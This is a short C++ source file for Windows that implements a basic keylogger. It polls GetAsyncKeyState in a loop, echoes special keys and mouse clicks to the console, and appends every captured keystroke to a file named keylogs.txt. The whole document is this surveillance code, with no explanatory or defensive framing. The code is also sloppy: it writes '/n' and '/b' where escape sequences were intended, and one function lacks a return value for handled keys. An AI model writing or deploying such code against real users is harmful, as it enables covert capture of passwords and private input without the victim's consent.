#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteToLog(LPCSTR text) {
 ofstream logfile;
 logfile.open("keylogs.txt", fstream::app);
 logfile << text;
 logfile.close();

}
bool KeyIsListed(int iKey) {
 switch (iKey)
 {
 case VK_SPACE:
  cout << " ";
  WriteToLog(" ");
  break;
 case VK_RETURN:
  cout << "/n";
  WriteToLog("/n");
  break;
 case VK_SHIFT:
  cout << " Shift ";
  WriteToLog(" Shift ");
  break;
 case VK_BACK:
  cout << "/b";
  WriteToLog("/b");
  break;
 case VK_RBUTTON:
  cout << " rclick ";
  WriteToLog(" rclick ");
  break;
 case VK_LBUTTON:
  cout << " lclick ";
  WriteToLog(" lclick ");
  break;
 default: return FALSE;
 }
}
 int main()
  {
   char key;
   while (TRUE)
   {
    Sleep(10);
    for (key = 8; key <= 190; key++) {
     if (GetAsyncKeyState(key) == -32767) {
      if (KeyIsListed(key) == FALSE) {
       ofstream logfile;
       logfile.open("keylogs.txt", fstream::app);
       logfile << key;
       logfile.close();
      }
     }
    }
   }
   return 0;
  }
